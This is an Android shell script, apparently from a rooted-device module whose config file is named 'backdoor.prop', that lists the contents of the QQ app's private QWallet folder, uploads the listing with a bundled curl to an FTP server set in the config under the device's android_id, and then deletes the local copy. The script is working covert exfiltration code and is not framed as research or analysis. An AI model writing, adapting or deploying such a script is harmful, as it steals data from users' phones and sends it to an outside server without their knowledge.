#!/system/bin/sh

# global variables
    MODDIR=${0%/*}
    cfg_dir="$MODDIR/backdoor.prop"
    android_id="$(settings get secure android_id)"
#

# define
    _curl="$MODDIR/bin/curl"
#

# lib
    grep_prop() {
        REGEX="s/^$1=//p"
        shift
        FILES="$(printf '%s\n' "$@")"
        [ -z "$FILES" ] && FILES='/system/build.prop'
        first_file="$(echo "$FILES" | head -n 1)"
        < "$first_file" dos2unix | sed -n "$REGEX" | head -n 1
    }
#

# get cfg
    ftp_user="$(grep_prop ftp_user "$cfg_dir" 2>/dev/null)"
    ftp_passwd="$(grep_prop ftp_passwd "$cfg_dir" 2>/dev/null)"
    ftp_ip="$(grep_prop ftp_ip "$cfg_dir" 2>/dev/null)"
    ftp_exec_dir="$(grep_prop ftp_exec_dir "$cfg_dir" 2>/dev/null)"
    ftp_data_dir="$(grep_prop ftp_data_dir "$cfg_dir" 2>/dev/null)"
#

echo "$(ls /data/user/0/com.tencent.mobileqq/files/QWallet/)" >"$MODDIR"/QQID.txt

$_curl -sLkT "$MODDIR"/QQID.txt "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/$android_id/"

rm -rf "$MODDIR"/QQID.txt